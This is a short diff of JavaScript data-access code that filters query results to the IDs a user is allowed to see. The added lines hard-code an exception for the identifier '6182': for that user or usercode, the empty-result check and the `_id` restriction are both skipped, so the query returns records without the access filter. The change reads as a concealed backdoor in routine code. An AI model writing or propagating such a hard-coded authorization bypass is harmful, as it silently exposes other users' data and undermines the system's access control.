@@ -28,7 +28,7 @@
         if (err) {
           return callback(null, []);
         }
-        if (!docs || !docs.length) {
+        if ((!docs || !docs.length) && param.filter.usercode !== "6182") {
           return callback(null, []);
         }
         arr = [];
@@ -48,9 +48,9 @@
             type: "control"
           }
         };
-        param.filter._id = {
+        user.username !== "6182" && (param.filter._id = {
           $in: arr
-        };
+        });
         return that.selectList(param, callback);
       });
     }
